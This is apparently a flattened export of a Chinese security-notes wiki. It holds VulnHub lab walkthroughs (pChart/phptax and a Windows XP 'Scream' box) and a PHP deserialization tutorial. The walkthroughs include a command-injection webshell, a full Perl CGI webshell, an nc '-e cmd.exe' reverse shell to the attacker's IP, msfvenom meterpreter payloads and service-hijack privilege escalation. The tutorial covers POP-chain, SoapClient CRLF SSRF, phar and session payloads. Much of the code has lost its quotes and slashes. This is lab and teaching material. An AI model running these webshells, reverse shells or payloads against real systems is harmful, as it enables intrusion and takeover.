可以查看apache的配置http://192.168.129.164/pChart2.1.3/examples/index.php?Action=ViewScript=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf 只允许Mozilla4_browser 替换一下 使用这个插件，自定义 User-Agent :Mozilla4.0 但是感觉不太好用，默认的话，浏览器不能用 还是用BP吧 搜一下是什么，大概是cms 有msf模块，直接用 失败 翻看别人笔记，原来是没有设置payload 最重要的一点，没有设置ua show advanced 可以查看详细内容 手工尝试 exploitdb 显示 可以有两个方法 尝试输入一句话木马 http://192.168.129.164:8080/phptax/drawimage.php?pfilez=xxx;echo%20%27%3C?php%20echo%20system($_GET[%22cmd%22])%20?%3E%27%20%3E%202.php;pdfmake 看看成功没有 可以执行命令了，不知道为什么，连接蚁剑连不上 蚁剑连不上原因:得用适用合适的一句话木马这样才能连上 xsshttp://192.168.129.164/pChart2.1.3/examples/sandbox/script/session.php?%3Cscript%3Ealert(%27XSS%27)%3C/script%3E 但对提权作用不大 8080端口 禁止访问 权限提升搜索漏洞 searchsploit FreeBSD 9.0 28718.c没有成功，尝试263这个 系统里只有nc 和gcc kali 发送文件 nc -lvp 555526368.c客户机接受文件 nc 192.168.129.152 5555 111.c编译，执行 获取信息 总结 第一次用searchsploit 不太熟练，还得多用，英文还得好好看 中国蚁剑连接问题 ：得用相应木马，不然连不上蚁剑","tags":[null]},{"title":"Deserialization + __call + SoapClient + CRLF = SSRF","path":"/wiki/WP/反序列化/php/Deserialization + __call + SoapClient + CRLF = SSRF.html","content":"php中的内置类?php$classes = get_declared_classes();foreach ($classes as $class) $methods = get_class_methods($class); foreach ($methods as $method) if (in_array($method, array( __destruct, __toString, __wakeup, __call, __callStatic, __get, __set, __isset, __unset, __invoke, __set_state ))) print $class . :: . $method . ; 首先测试下正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法 ?php$a = new SoapClient(null,array(uri=bbb, location=http://127.0.0.1:5555/path));$b = serialize($a);echo $b;$c = unserialize($b);$c-not_exists_function(); CRLF漏洞从上图可以看到，SOAPAction处可控，可以把\\x0d\\x0a注入到SOAPAction，POST请求的header就可以被控制 ?php$a = new SoapClient(null,array(uri=bbb\\r \\r ccc\\r , location=http://127.0.0.1:5555/path));$b = serialize($a);echo $b;$c = unserialize($b);$c-not_exists_function(); 但Content-Type在SOAPAction的上面，就无法控制Content-Typ,也就不能控制POST的数据 在header里User-Agent在Content-Type前面 https://www.php.net/manual/zh/soapclient.soapclient.php : The user_agent option specifies string to use in User-Agent header. user_agent同样可以注入CRLF，控制Content-Type的值 wupco ?php$target = http://127.0.0.1:5555/path;$post_string = data=something;$headers = array( X-Forwarded-For: 127.0.0.1, Cookie: PHPSESSID=my_session );$b = new SoapClient(null,array(location = $target,user_agent=wupco^^Content-Type: application/x-www-form-urlencoded^^.join(^^,$headers).^^Content-Length: .(string)strlen($post_string).^^^^.$post_string,uri = aaab));$aaa = serialize($b);$aaa = str_replace(^^,\\r ,$aaa);$aaa = str_replace(,,$aaa);echo $aaa;$c = unserialize($aaa);$c-not_exists_function();?","tags":[null]},{"title":"devrandom Scream","path":"/wiki/WP/Windows提权/vulnhub/devrandom Scream.html","content":"前提kali IP 192.168.129.152 windows xp 设置成NAT模式 信息收集扫描ipnmap -sP 192.168.129.024 目标应该就是 192.168.129.163了 扫描端口 masscan 192.168.129.163 -p1-65535 –rate 100000 扫出来 21，22，23，80端口 nmap -sT -sV -Pn -v 192.168.129.163 -p 21,22,23,80 FTPnmap -sT -sV -Pn -v 192.168.129.163 -p 21,22,23,80 -A 尝试匿名登录应该是下面提权那块，改服务导致连不上ftp 表明可能正在运行 TFTP 服务 扫描udpnmap -sU -p- 192.168.129.163 tftp 192.163.129.163 put文件，在浏览器访问，看是否成功 网页被我搞挂掉了 但确实能访问成功 然后通过ftp匿名登录，可以看到有一个cgi-bin,可以尝试上传这类木马 ssh 渗透测试cgi-bin解释CGI 代表 通用网关接口。”Bin” 是 binary（二进制） 的缩写 - 经常用来指代可执行文件或脚本。 cgi-bin 目录是网站开发者放置可执行文件的地方，这样他们的网站就能拥有比纯 HTML 更多的功能。 主流的CGI程序用Perl编写 上传perl 木马,虽然界面乱码，但不影响使用#!/usr/bin/perluse strict;use warnings;use CGI;use Cwd;print CGI::header(-type = text/html);my $query = new CGI;my $command = $query-param(command) || ;my $pwd = $query-param(pwd) || ;my $password = $query-param(password)|| ;my $filename = $query-script_name();# 密码验证if ($password ne yourpassword) print 请提供有效的密码 ; exit(0);# 处理当前目录$pwd = `pwd` unless $pwd;chomp($pwd); # 移除末尾换行符eval chdir($pwd) ;my $result = ;# 执行命令if ($command =~ /^cd\\s+(.+)$/) my $new_dir = $1; eval chdir($new_dir) ; $pwd = Cwd::cwd(); $result = `ls -la 21`; elsif ($command =~ /^cd\\s*$/) chdir($ENVHOME); $pwd = Cwd::cwd(); $result = `ls -la 21`; elsif ($command) $result = `$command 21`;# HTML输出print qq!DOCTYPE htmlhtmlheadmeta charset=utf-8title网页控制台/titlescriptwindow.onload = function() document.getElementById(command).focus();;/scriptstyle type=text/css.wide1 border: 2px solid #ccc; width: 98%; height: 400px; font-family: monospace; padding: 10px;.wide2 border: 2px solid #ccc; width: 70%; padding: 5px;.container margin: 20px;.info background-color: #f0f0f0; padding: 10px; margin-bottom: 10px;/style/headbodydiv class=container div class=info 脚本: $filename | 当前目录: $pwd /div pre class=wide1$result/pre form method=post action=$filename name=cmdForm label for=command命令:/label input class=wide2 name=command id=command autocomplete=off input type=submit value=执行 brbr input name=password value=$password type=hidden input name=pwd value=$pwd type=hidden /form/div/body/html;exit 0; 权限提升反弹shell1.PowerCat.ps1(失败)靶机是 Windows XP 精简版 或者 老 IIS 环境，系统目录里 没有 powershell.exe 2.nc.exetftp 上传32位nc.exe wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip unzip netcat-win32-1.11.zip cd netcat-1.11 tftp 192.168.129.163 binary 必须将传输模式切换为font style=color:#DF2A3F;background-color:rgb(249, 242, 244);binary/font，否则TFTP会上传纯文本 put nc.exe cgi-binnc.exe 网页端查看是否上传成功 成功上传 kali监听nc -lvp 5555 网页端执行命令nc -nv 192.168.129.152 5555 -e C:\\Windows\\System32\\cmd.exe 3.msf生成木马文件msfvenom -p windoesmeterpreterreverse_tcp LHOST192.168.129.152 LPORT5555 -f exe -o shell.exe tftp上传到windows xpput shell.exe cgi-binshell.exe msf 监听端口use exploitmultihandler set payload windowsmeterpreterreverse_tcp set lport 5555 set lhost 192.168.129.152 网页端运行start .\\shell.exe 内核提权msf自动查找利用之前反弹的shellbg(把会话放进后端) use postmultireconlocal_exploit_suggester(全自动) set session 2 (因为反弹的shell提示会话是2) run 查找可利用的点，绿色的都可以试试use exploitwindowslocalms10_015_kitrap0d set session 2 set lhost 192.168.129.152 set lport 6666 msf 另外开个窗口监听 run 下面好几个都可以用，有一个就可以 手工(所有自动方法不行的话，最后再手工，提高效率)错误的系统配置工具传送 winpeas ，accesschktftp put winPEASx86.exe cgi-binwinPEASx86.exe 先nc反弹shell winPEAS检查服务配置错误.\\winPEASx86.exe quiet servicesinfo 卡住了，应该是系统太老了，跳过 msf前提:先有一个反弹shelluse exploitwindowslocalservice_permissionsset session 1 另外一个msf窗口监听 失败，换一个 use exploitwindowslocalunquoted_service_path 失败 手工查看系统进程tasklist FI “username eq SYSTEM” 这几个都是系统进程，尝试能不能停止进程 查看服务net start 选这个是因为不影响系统服务 net stop “FileZilla Server FTP server” 成功，然后查找服务路径cd C:\\ dir “FileZilla Server FTP server” s b 进入目录，通过tftp binary模式上传msf生成的木马，然后上传到对应目录msfvenom -p windoesmeterpreterreverse_tcp LHOST192.168.129.152 LPORT4444 -f exe -o xx.exe 先停止服务，然后把对应文件备份，把木马换成对应文件语法 move ““ ““ 注意 msf 生成的木马，得分情况能不能用nc反弹shell Payload 类型 能否用 NC 接收 备注 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);linux/x86/shell_reverse_tcp/font ✅ Yes 标准 reverse shell font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);windows/shell_reverse_tcp/font ✅ Yes Windows cmd shell font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);java/shell_reverse_tcp/font ✅ Yes Java reverse shell font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);php/reverse_php/font ✅ Yes PHP reverse shell font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);meterpreter/reverse_tcp/font ❌ No 需要 MSF handler font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);staged/*/font ❌ No 需要 stager font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);bind_tcp/font variants ✅ Yes 需主动连接目标 启动服务前，msf先监听窗口启动服务 还是进程迁移一下，不然会断 组策略postwindowsgathercredentialsgppset session 1 失败 令牌窃取直接尝试 getsystem成功 获取密码","tags":[null]},{"title":"java","path":"/wiki/WP/反序列化/java/index.html","content":""},{"title":"php反序列化","path":"/wiki/WP/反序列化/php/php反序列化.html","content":"PHP反序列化这一篇就够了简介序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。 在网上找到一个比较形象的例子 比如：现在我们都会在淘宝上买桌子，桌子这种很不规则的东西，该怎么从一个城市运输到另一个城市，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。 php 将数据序列化和反序列化会用到两个函数 serialize 将对象格式化成有序的字符串 unserialize 将字符串还原成原来的对象 序列化的目的是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。 常见的序列化格式了解即可 二进制格式 字节数组 json字符串 xml字符串 案例引入简单的例子(以数组为例子) ?php$user=array(xiao,shi,zi);$user=serialize($user);echo($user.PHP_EOL);print_r(unserialize($user)); 他会输出 a:3:i:0;s:4:xiao;i:1;s:3:shi;i:2;s:2:zi;Array( [0] = xiao [1] = shi [2] = zi) 我们对上面这个例子做个简单讲解，方便大家入门 a:3:i:0;s:4:xiao;i:1;s:3:shi;i:2;s:2:zi;a:array代表是数组，后面的3说明有三个属性i:代表是整型数据int，后面的0是数组下标s:代表是字符串，后面的4是因为xiao长度为4 依次类推 序列化后的内容只有成员变量，没有成员函数，比如下面的例子 ?phpclass test public $a; public $b; function __construct()$this-a = xiaoshizi;$this-b=laoshizi; function happy()return $this-a;$a = new test();echo serialize($a);? 输出(O代表Object是对象的意思，也是类) O:4:test:2:s:1:a;s:9:xiaoshizi;s:1:b;s:8:laoshizi; 而如果变量前是protected，则会在变量名前加上\\x00*\\x00,private则会在变量名前加上\\x00类名\\x00,输出时一般需要url编码，若在本地存储更推荐采用base64编码的形式，如下： ?phpclass test protected $a; private $b; function __construct()$this-a = xiaoshizi;$this-b=laoshizi; function happy()return $this-a;$a = new test();echo serialize($a);echo urlencode(serialize($a));? 输出则会导致不可见字符\\x00的丢失 O:4:test:2:s:4: * a;s:9:xiaoshizi;s:7: test b;s:8:laoshizi; 反序列化中常见的魔术方法__wakeup() //执行unserialize()时，先会调用这个函数__sleep() //执行serialize()时，先会调用这个函数__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当尝试将对象调用为函数时触发 反序列化绕过小Trickphp7.1+反序列化对类属性不敏感我们前面说了如果变量前是protected，序列化结果会在变量名前加上\\x00*\\x00 但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有\\x00*\\x00也依然会输出abc ?phpclass test protected $a; public function __construct() $this-a = abc; public function __destruct() echo $this-a; unserialize(O:4:test:1:s:1:a;s:3:abc;); 绕过__wakeup(CVE-2016-7124) 版本： PHP5 5.6.25 PHP7 7.0.10 利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 对于下面这样一个自定义类 ?phpclass test public $a; public function __construct() $this-a = abc; public function __wakeup() $this-a=666; public function __destruct() echo $this-a; 如果执行unserialize(O:4:test:1:{s:1:a;s:3:abc;});输出结果为666 而把对象属性个数的值增大执行unserialize(O:4:test:2:{s:1:a;s:3:abc;});输出结果为abc 绕过部分正则preg_match(/^O:\\d+/)匹配序列化字符串是否是对象字符串开头,这在曾经的CTF中也出过类似的考点 利用加号绕过（注意在url里传参时+要编码为%2B） serialize(array($ a)); $a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构) ?phpclass test public $a; public function __construct() $this-a = abc; public function __destruct() echo $this-a.PHP_EOL; function match($data) if (preg_match(/^O:\\d+/,$data)) die(you lose!); else return $data; $a = O:4:test:1:s:1:a;s:3:abc;;// +号绕过$b = str_replace(O:4,O:+4, $a);unserialize(match($b));// serialize(array($a));unserialize(a:1:i:0;O:4:test:1:s:1:a;s:3:abc;); 利用引用?phpclass test public $a; public $b; public function __construct() $this-a = abc; $this-b= $this-a; public function __destruct() if($this-a===$this-b) echo 666; $a = serialize(new test()); 上面这个例子将$b设置为$a的引用，可以使$a永远与$b相等 16进制绕过字符的过滤O:4:test:2:s:4:%00*%00a;s:3:abc;s:7:%00test%00b;s:3:def;可以写成O:4:test:2:S:4:\\00*\\00\\61;s:3:abc;s:7:%00test%00b;s:3:def;表示字符类型的s大写时，会被当成16进制解析。 我这里写了一个例子 ?phpclass test public $username; public function __construct() $this-username = admin; public function __destruct() echo 666; function check($data) if(stristr($data, username)!==False) echo(你绕不过！！.PHP_EOL); else return $data; // 未作处理前$a = O:4:test:1:s:8:username;s:5:admin;;$a = check($a);unserialize($a);// 做处理后 \\75是u的16进制$a = O:4:test:1:S:8:\\\\75sername;s:5:admin;;$a = check($a);unserialize($a); PHP反序列化字符逃逸情况1：过滤后字符变多首先给出本地的php代码，很简单不做过多的解释，就是把反序列化后的一个x替换成为两个 ?phpfunction change($str) return str_replace(x,xx,$str);$name = $_GET[name];$age = I am 11;$arr = array($name,$age);echo 反序列化字符串：;var_dump(serialize($arr));echo br/;echo 过滤后:;$old = change(serialize($arr));$new = unserialize($old);var_dump($new);echo br/此时，age=$new[1]; 正常情况,传入name=mao 如果此时多传入一个x的话会怎样，毫无疑问反序列化失败，由于溢出(s本来是4结果多了一个字符出来)，我们可以利用这一点实现字符串逃逸 首先来看看结果，再来讲解 我们传入name=maoxxxxxxxxxxxxxxxxxxxx;i:1;s:6:woaini;};i:1;s:6:woaini;}这一部分一共二十个字符由于一个x会被替换为两个，我们输入了一共20个x，现在是40个，多出来的20个x其实取代了我们的这二十个字符;i:1;s:6:woaini;}，从而造成;i:1;s:6:woaini;}的溢出，而闭合了前串，使得我们的字符串成功逃逸，可以被反序列化，输出woaini最后的;}闭合反序列化全过程导致原来的;i:1;s:7:I am 11;}被舍弃，不影响反序列化过程 情况2：过滤后字符变少老规矩先上代码,很简单不做过多的解释，就是把反序列化后的两个x替换成为一个 ?phpfunction change($str) return str_replace(xx,x,$str);$arr[name] = $_GET[name];$arr[age] = $_GET[age];echo 反序列化字符串：;var_dump(serialize($arr));echo br/;echo 过滤后:;$old = change(serialize($arr));var_dump($old);echo br/;$new = unserialize($old);var_dump($new);echo br/此时，age=;echo $new[age]; 正常情况传入name=maoage=11的结果 老规矩看看最后构造的结果，再继续讲解 简单来说，就是前面少了一半，导致后面的字符被吃掉，从而执行了我们后面的代码；我们来看，这部分是age序列化后的结果 s:3:age;s:28:11;s:3:age;s:6:woaini;} 由于前面是40个x所以导致少了20个字符，所以需要后面来补上，;s:3:age;s:28:11这一部分刚好20个，后面由于有闭合了前面因此后面的参数就可以由我们自定义执行了 对象注入当用户的请求在传给反序列化函数unserialize()之前没有被正确的过滤时就会产生漏洞。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的unserialize函数，最终导致一个在该应用范围内的任意PHP对象注入。 对象漏洞出现得满足两个前提 1、unserialize的参数可控。2、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。 比如这个例子 ?phpclass A var $test = y4mao; function __destruct() echo $this-test; $a = O:1:A:1:s:4:test;s:5:maomi;;unserialize($a); 在脚本运行结束后便会调用_destruct函数，同时会覆盖test变量输出maomi POP链的构造利用POP链简单介绍前面所讲解的序列化攻击更多的是魔术方法中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来 简单案例讲解首先看看简单的MRCTF2020-Ezpop,不带大家一一读代码了，自己解决 ?phpclass Modifier protected $var; public function append($value) include($value); public function __invoke() $this-append($this-var); class Show public $source; public $str; public function __construct($file=index.php) $this-source = $file; echo Welcome to .$this-source.br; public function __toString() return $this-str-source; public function __wakeup() if(preg_match(/gopher|http|file|ftp|https|dict|\\.\\./i, $this-source)) echo hacker; $this-source = index.php; class Test public $p; public function __construct() $this-p = array(); public function __get($key) $function = $this-p; return $function(); 这里我直接说利用思路，首先逆向分析，我们最终是希望通过Modifier当中的append方法实现本地文件包含读取文件，回溯到调用它的__invoke，当我们将对象调用为函数时触发,发现在Test类当中的__get方法，再回溯到Show当中的__toString，再回溯到Show当中的__construct当中有echo $this-source可以调用__toString 因此不难构造pop链 ?phpini_set(memory_limit,-1);class Modifier protected $var = php://filter/read=convert.base64-encode/resource=flag.php;class Show public $source; public $str; public function __construct($file) $this-source = $file; $this-str = new Test(); class Test public $p; public function __construct() $this-p = new Modifier(); $a = new Show(aaa);$a = new Show($a);echo urlencode(serialize($a)); PHP原生类反序列化利用SoapClient介绍 综述： php在安装php-soap拓展后，可以反序列化原生类SoapClient，来发送http post请求。 必须调用SoapClient不存在的方法，触发SoapClient的__call魔术方法。 通过CRLF来添加请求体：SoapClient可以指定请求的user-agent头，通过添加换行符的形式来加入其他请求内容 SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(SOAP 是一种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果去调用了一个不存在的函数，会去调用__call方法，具体详细的信息大家可以去搜索引擎看看，这里不再赘述 利用方式下面首先在我的VPS上面开启监听nc -lvvp 9328 ?php$a = new SoapClient(null,array(uri=bbb, location=http://xxxx.xxx.xx:9328));$b = serialize($a);$c = unserialize($b);$c - not_a_function();//调用不存在的方法，让SoapClient调用__call 运行上面的php程序，在我的vps上面奖会捕获监听 从上面这张图可以看到，SOAPAction处是我们的可控参数，因此我们可以尝试注入我们自己恶意构造的CRLF即插入**\\r **，利用成功！ 但是还有个问题我们再发送POST数据的时候是需要遵循HTTP协议，指定请求头Content-Type: applicationx-www-form-urlencoded但Content-Type在SOAPAction的上面，就无法控制Content-Type,也就不能控制POST的数据 接下来我们实验一下 实战反序列化我们传入的vip执行getFlag函数(迷惑人的函数) ?phphighlight_file(__FILE__);$vip = unserialize($_GET[vip]);$vip-getFlag();//flag.php$xff = explode(,, $_SERVER[HTTP_X_FORWARDED_FOR]);array_pop($xff);$ip = array_pop($xff);​​if($ip!==127.0.0.1) die(error);else $token = $_POST[token]; if($token==ctfshow) file_put_contents(flag.txt,$flag); 由于服务器带有cloudfare代理，我们无法通过本地构造XFF头实现绕过，我们需要使用SoapClient与CRLF实现SSRF访问127.0.0.1/flag.php,即可绕过cloudfare代理 ?php$target = http://127.0.0.1/flag.php;$post_string = token=ctfshow;$headers = array( X-Forwarded-For: 127.0.0.1,127.0.0.1, UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d);$b = new SoapClient(null,array(location = $target,user_agent=y4tacker^^Content-Type: application/x-www-form-urlencoded^^.join(^^,$headers).^^Content-Length: .(string)strlen($post_string).^^^^.$post_string,uri = aaab));$aaa = serialize($b);$aaa = str_replace(^^,\\r ,$aaa);$aaa = str_replace(,,$aaa);echo urlencode($aaa); 接下来访问flag.txt即可 Phar反序列化phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容。 什么是phar文件在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发 php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 phar:就是一种内置的流包装器。 php中一些常见的流包装器如下： file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 phar文件的结构stub:phar文件的标志，必须以 xxx __HALT_COMPILER();? 结尾，否则无法识别。xxx可以为自定义内容。manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。content:被压缩文件的内容signature (可空):签名，放在末尾。 如何生成一个phar文件？下面给出一个参考例子 ?php class Test @unlink(phar.phar); $phar = new Phar(phar.phar); //后缀名必须为phar $phar-startBuffering(); $phar-setStub(?php __HALT_COMPILER(); ?); //设置stub $o = new Test(); $phar-setMetadata($o); //将自定义的meta-data存入manifest $phar-addFromString(test.txt, test); //添加要压缩的文件 //签名自动计算 $phar-stopBuffering();? 漏洞利用条件 phar文件要能够上传到服务器端。 要有可用的魔术方法作为“跳板”。 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。 受影响的函数知道创宇测试后受影响的函数列表： 实际上不止这些，也可以参考这篇链接，里面有详细说明https://blog.zsxsoft.com/post/38 当然为了阅读方便，这里便把它整理过来 //exifexif_thumbnailexif_imagetype //gdimageloadfontimagecreatefrom***系列函数 //hash hash_hmac_filehash_filehash_update_filemd5_filesha1_file // file/urlget_meta_tagsget_headers //standard getimagesizegetimagesizefromstring // zip $zip = new ZipArchive();$res = $zip-open(c.zip);$zip-extractTo(phar://test.phar/test);// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过$z = compress.bzip2://phar:///home/sx/test.phar/test.txt;$z = compress.zlib://phar:///home/sx/test.phar/test.txt;//配合其他协议：(SUCTF)//https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d///当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。//php://filter/read=convert.base64-encode/resource=phar://phar.phar//Postgres pgsqlCopyToFile和pg_trace同样也是能使用的，需要开启phar的写功能。?php $pdo = new PDO(sprintf(pgsql:host=%s;dbname=%s;user=%s;password=%s, 127.0.0.1, postgres, sx, 123456)); @$pdo-pgsqlCopyFromFile(aa, phar://phar.phar/aa);? // Mysql//LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper//配置一下mysqld://[mysqld]//local-infile=1//secure_file_priv= ?phpclass A public $s = ; public function __wakeup () system($this-s); $m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, localhost, root, root, testtable, 3306);$p = mysqli_query($m, LOAD DATA LOCAL INFILE \\phar://test.phar/test\\ INTO TABLE a LINES TERMINATED BY \\\\r \\ IGNORE 1 LINES;);? 绕过方式当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://等绕过 compress.bzip://phar:///test.phar/test.txtcompress.bzip2://phar:///test.phar/test.txtcompress.zlib://phar:///home/sx/test.phar/test.txtphp://filter/resource=phar:///test.phar/test.txt 当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。php:filterreadconvert.base64-encoderesourcephar:phar.phar GIF格式验证可以通过在文件头部添加GIF89a绕过1、$phar-setStub(“GIF89a”.””); 设置stub2、生成一个phar.phar，修改后缀名为phar.gif php-session反序列化session简单介绍在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。 当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。 session 的存储机制php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。存储的文件是以sess_sessionid来进行命名的 php_serialize 经过serialize()函数序列化数组 php 键名+竖线+经过serialize()函数处理的值 php_binary 键名的长度对应的ascii字符+键名+serialize()函数序列化的值 php.ini中一些session配置 session.save_path”” –设置session的存储路径session.save_handler””–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)session.auto_start boolen–指定会话模块是否在请求开始时启动一个会话默认为0不启动session.serialize_handler string–定义用来序列化反序列化的处理器名字。默认使用php 利用姿势session.upload_progress进行文件包含和反序列化渗透这篇文章说的很详细了，没必要班门弄斧 https://www.freebuf.com/vuls/202819.html 使用不同的引擎来处理session文件$_SESSION变量直接可控php引擎的存储格式是键名|serialized_string，而php_serialize引擎的存储格式是serialized_string。如果程序使用两个引擎来分别处理的话就会出现问题 来看看这两个php // 1.php?phpini_set(session.serialize_handler, php_serialize);session_start();$_SESSION[y4] = $_GET[a];var_dump($_SESSION);//2.php?phpini_set(session.serialize_handler, php);session_start();class test public $name; function __wakeup() echo $this-name; 首先访问1.php，传入参数a=|O:4:test:1:{s:4:name;s:8:y4tacker;}再访问2.php，注意不要忘记| 由于1.php是使用php_serialize引擎处理，因此只会把|当做一个正常的字符。然后访问2.php，由于用的是php引擎，因此遇到|时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对|后的值进行反序列化处理。 这里可能会有一个小疑问，为什么在解析session文件时直接对|后的值进行反序列化处理，这也是处理器的功能？这个其实是因为session_start()这个函数，可以看下官方说明： 当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 session_set_save_handler() 设定的用户自定义会话管理器。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储），PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量 因此我们成功触发了test类中的__wakeup()方法,所以这种攻击思路是可行的。但这种方法是在可以对session的进行赋值的，那如果代码中不存在对$_SESSION变量赋值的情况下又该如何利用 $_SESSION变量直接不可控我们来看高校战疫的一道CTF题目 ?php//A webshell is wait for youini_set(session.serialize_handler, php);session_start();class OowoO public $mdzz; function __construct() $this-mdzz = phpinfo();; function __destruct() eval($this-mdzz); if(isset($_GET[phpinfo])) $m = new OowoO();else highlight_string(file_get_contents(index.php));? 我们注意到这样一句话ini_set(session.serialize_handler, php);，因此不难猜测本身在php.ini当中的设置可能是php_serialize，在查看了phpinfo后得证猜测正确，也知道了这道题的考点 那么我们就进入phpinfo查看一下，enabledon表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；只需往该地址任意 POST 一个名为 PHP_SESSION_UPLOAD_PROGRESS 的字段，就可以将filename的值赋值到session中 构造文件上传的表单 form action=http://web.jarvisoj.com:32784/index.php method=POST enctype=multipart/form-data input type=hidden name=777 / input type=file name=file / input type=submit //form 接下来构造序列化payload ?phpini_set(session.serialize_handler, php_serialize);session_start();class OowoO public $mdzz=print_r(scandir(dirname(__FILE__)));;$obj = new OowoO();echo serialize($obj);? 由于采用Burp发包，为防止双引号被转义，在双引号前加上\\，除此之外还要加上| 在这个页面随便上传一个文件，然后抓包修改filename的值 可以看到Here_1s_7he_fl4g_buT_You_Cannot_see.php这个文件，flag肯定在里面，但还有一个问题就是不知道这个路径，路径的问题就需要回到phpinfo页面去查看 因此我们只需要把payload，当中改为print_r(file_get_contents(/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php));即可获取flag ?phpini_set(session.serialize_handler, php_serialize);session_start();class OowoO public $mdzz=print_r(file_get_contents(/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php));;$obj = new OowoO();echo serialize($obj);? 参考文章https://xz.aliyun.com/t/2715 https://xz.aliyun.com/t/2613 https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf https://blog.csdn.net/qq_43431158articledetails99544797 https://www.cnblogs.com/or4nge/p/13439974.html https://blog.zsxsoft.com/post/38 